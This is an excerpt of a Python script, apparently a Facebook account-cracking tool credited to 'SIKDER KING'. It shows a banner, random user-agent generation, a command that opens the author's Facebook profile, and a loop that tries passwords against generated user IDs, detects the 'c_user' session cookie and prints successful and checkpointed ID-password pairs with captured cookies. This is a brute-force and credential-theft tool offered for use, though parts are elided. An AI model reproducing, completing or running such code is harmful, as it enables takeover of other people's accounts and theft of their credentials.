...
for xd in range(10000):
    ...
    uaku2=f'{aa} {b}; {c}{d}{e}{f}) {g}{h}.{i}.{j}.{k} {l}'
    ugen.append(uaku2)
os.system('xdg-open https://www.facebook.com/profile.php?id=100014423672720')
logo = ("""\033[38;5;48m
$$\   $$\ $$$$$$\ $$\   $$\  $$$$$$\  
$$ | $$  |\_$$  _|$$$\  $$ |$$  __$$\ 
$$ |$$  /   $$ |  $$$$\ $$ |$$ /  \__|
...
\033[38;5;96m\033[47m B \x1b[0m\033[38;5;196m DEVELOPER   :   SIKDER KING
\033[38;5;97m\033[47m O \x1b[0m\033[38;5;197m GITHUB      :   SIKDER KING
\033[38;5;98m\033[47m T \x1b[0m\033[38;5;198m POWER BY    :   KING CYBER\033[1;30m
\033[1;32m━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━""")
...
def num():
    ...
    os.system('clear')
    print(logo)
    print('[+] EXAMPLE : 30000, 50000, 100000, 500000 ')
    print("\033[1;32m━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━")
    ...
    try:
        for ps in pwx:
            ...
            if 'c_user' in log_cookies:
                ...
                cid = coki[7:22]
                print(f"\033[38;5;46m[SIKDER-ok💗] {uid} | {ps}")
                ...
                coki=";".join([key+"="+value for key,value in session.cookies.get_dict().items()])
                cid = coki[82:97]
                print(f"\x1b[38;5;196m[KING-cp] {cid} | {ps}")
